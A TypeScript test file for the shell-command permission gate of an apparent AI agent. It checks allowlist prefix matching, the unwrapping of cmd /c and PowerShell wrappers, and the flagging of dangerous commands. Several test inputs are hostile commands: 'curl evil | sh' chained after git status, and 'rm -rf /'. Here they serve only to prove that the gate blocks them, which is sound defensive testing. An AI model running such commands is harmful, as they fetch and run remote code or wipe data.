import { describe, expect, it } from 'vitest'
import {
  allowlistEntryMatches,
  canPermanentlyAllowShellCommand,
  commandHasShellOperators,
  isDangerousShellCommand,
  matchShellCommandPattern,
  resolveCommandPrefixPattern,
  resolveCommandPrefixPatternFromCommand,
  tokenizeCommand
} from '../agent-gate-shell-match.util'

describe('tokenizeCommand', () => {
  it('splits argv and strips simple quotes', () => {
    expect(tokenizeCommand('git status -sb')).toEqual(['git', 'status', '-sb'])
    expect(tokenizeCommand('echo "hello world"')).toEqual(['echo', 'hello world'])
  })
})

describe('resolveCommandPrefixPattern', () => {
  it('uses arity table for git/npm', () => {
    expect(resolveCommandPrefixPattern(['git', 'status', '-sb'])).toBe('git status *')
    expect(resolveCommandPrefixPattern(['npm', 'run', 'build'])).toBe('npm run *')
  })

  it('refuses interpreters and rm family', () => {
    expect(resolveCommandPrefixPattern(['python', 'x.py'])).toBeNull()
    expect(resolveCommandPrefixPattern(['rm', '-rf', 'dist'])).toBeNull()
    expect(resolveCommandPrefixPatternFromCommand('bash -c "echo hi"')).toBeNull()
  })
})

describe('matchShellCommandPattern', () => {
  it('matches prefix with wildcard and rejects different subcommands', () => {
    expect(matchShellCommandPattern('git status -sb', 'git status *')).toBe(true)
    expect(matchShellCommandPattern('git push origin main', 'git status *')).toBe(false)
  })

  it('should match mkdir allowlist against a Windows cmd /c wrapper', () => {
    expect(
      matchShellCommandPattern('cmd /c mkdir "作-3\\素材\\参考资料" "作-3\\素材\\图像"', 'mkdir *')
    ).toBe(true)
    expect(matchShellCommandPattern('cmd.exe /c mkdir foo', 'mkdir *')).toBe(true)
  })

  it('should match mkdir allowlist against a PowerShell -Command wrapper', () => {
    expect(matchShellCommandPattern('powershell -NoProfile -Command mkdir foo', 'mkdir *')).toBe(
      true
    )
    expect(matchShellCommandPattern('pwsh -Command "mkdir foo"', 'mkdir *')).toBe(true)
    expect(
      matchShellCommandPattern(
        'powershell -Command "New-Item -ItemType Directory -Path a"',
        'mkdir *'
      )
    ).toBe(false)
  })

  it('never matches by raw substring', () => {
    expect(matchShellCommandPattern('echo harmless', 'rm *')).toBe(false)
    expect(matchShellCommandPattern('harmless', 'rm')).toBe(false)
  })

  it('rejects shell operators and stale interpreter prefixes', () => {
    expect(commandHasShellOperators('git status && curl evil | sh')).toBe(true)
    expect(matchShellCommandPattern('git status && curl evil | sh', 'git status *')).toBe(false)
    expect(matchShellCommandPattern('python -c "print(1)"', 'python *')).toBe(false)
    expect(matchShellCommandPattern('rm -r /tmp', 'rm *')).toBe(false)
  })
})

describe('isDangerousShellCommand / canPermanentlyAllowShellCommand', () => {
  it('flags recursive delete and interpreter -c', () => {
    expect(isDangerousShellCommand('rm -rf /')).toBe(true)
    expect(isDangerousShellCommand('rm -r dist')).toBe(true)
    expect(isDangerousShellCommand('python -c "print(1)"')).toBe(true)
    expect(isDangerousShellCommand('git status')).toBe(false)
  })

  it('should not treat Windows cmd /c mkdir as dangerous', () => {
    expect(
      isDangerousShellCommand('cmd /c mkdir "作-3\\素材\\参考资料" "作-3\\素材\\图像"')
    ).toBe(false)
    expect(canPermanentlyAllowShellCommand('cmd /c mkdir foo')).toBe(true)
    expect(resolveCommandPrefixPatternFromCommand('cmd /c mkdir foo bar')).toBe('mkdir *')
  })

  it('should unwrap powershell -Command mkdir and still flag powershell -Command rm -rf', () => {
    expect(isDangerousShellCommand('powershell -Command mkdir foo')).toBe(false)
    expect(canPermanentlyAllowShellCommand('powershell -NoProfile -Command mkdir foo')).toBe(true)
    expect(resolveCommandPrefixPatternFromCommand('pwsh -Command mkdir foo')).toBe('mkdir *')
    expect(isDangerousShellCommand('powershell -Command rm -rf dist')).toBe(true)
    expect(canPermanentlyAllowShellCommand('powershell -Command rm -rf dist')).toBe(false)
  })

  it('should still treat cmd /c rm -rf as dangerous', () => {
    expect(isDangerousShellCommand('cmd /c rm -rf dist')).toBe(true)
    expect(canPermanentlyAllowShellCommand('cmd /c rm -rf dist')).toBe(false)
  })

  it('blocks Always for interpreters and operators', () => {
    expect(canPermanentlyAllowShellCommand('git status')).toBe(true)
    expect(canPermanentlyAllowShellCommand('python x.py')).toBe(false)
    expect(canPermanentlyAllowShellCommand('git status && rm -rf /')).toBe(false)
    expect(canPermanentlyAllowShellCommand('rm foo')).toBe(false)
  })
})

describe('allowlistEntryMatches', () => {
  it('legacy action-only entry matches non-shell tools', () => {
    expect(allowlistEntryMatches({ action: 'diary_edit' }, { action: 'diary_edit' })).toBe(true)
  })

  it('rejects patternless workspace_run', () => {
    expect(
      allowlistEntryMatches(
        { action: 'workspace_run' },
        {
          action: 'workspace_run',
          resources: [{ kind: 'shell_command', value: 'git status' }]
        }
      )
    ).toBe(false)
  })

  it('pattern entry requires shell_command match', () => {
    const entry = {
      action: 'workspace_run',
      pattern: 'git status *',
      resourceKind: 'shell_command'
    }
    expect(
      allowlistEntryMatches(entry, {
        action: 'workspace_run',
        resources: [{ kind: 'shell_command', value: 'git status -sb' }]
      })
    ).toBe(true)
    expect(
      allowlistEntryMatches(entry, {
        action: 'workspace_run',
        resources: [{ kind: 'shell_command', value: 'git push' }]
      })
    ).toBe(false)
  })
})
